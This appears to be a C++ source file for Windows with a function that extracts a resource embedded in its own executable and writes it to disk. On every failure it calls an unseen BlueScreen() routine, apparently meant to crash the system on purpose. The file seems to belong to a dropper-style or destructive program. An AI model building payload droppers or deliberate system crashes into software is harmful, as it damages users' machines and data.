#include <Windows.h>
#include "extractRsc.h"
#include "main.h"
#include <fstream>

void CopyResource(const wchar_t* outputFilePath, int FILE_ID, int FILE_TYPE) {
	HMODULE hModule = NULL;
	GetModuleHandleEx(
		GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
		(LPCTSTR)CopyResource,
		&hModule
	);

	HRSRC hRes = FindResource(hModule, MAKEINTRESOURCE(FILE_ID), MAKEINTRESOURCE(FILE_TYPE));
	if (hRes == NULL) {
		BlueScreen();
	}

	HGLOBAL hData = LoadResource(hModule, hRes);
	if (hData == NULL) {
		BlueScreen();
	}

	DWORD hSize = SizeofResource(hModule, hRes);
	if (hSize == 0) {
		BlueScreen();
	}

	char* hFinal = (char*)LockResource(hData);
	if (hFinal == NULL) {
		BlueScreen();
	}

	std::ofstream outputFile(outputFilePath, std::ios_base::binary | std::ios_base::trunc);
	if (!outputFile) {
		BlueScreen();
	}

	outputFile.write(hFinal, hSize);
	if (!outputFile) {
		outputFile.close();
		DeleteFile(outputFilePath);
		BlueScreen();
	}

	outputFile.close();
}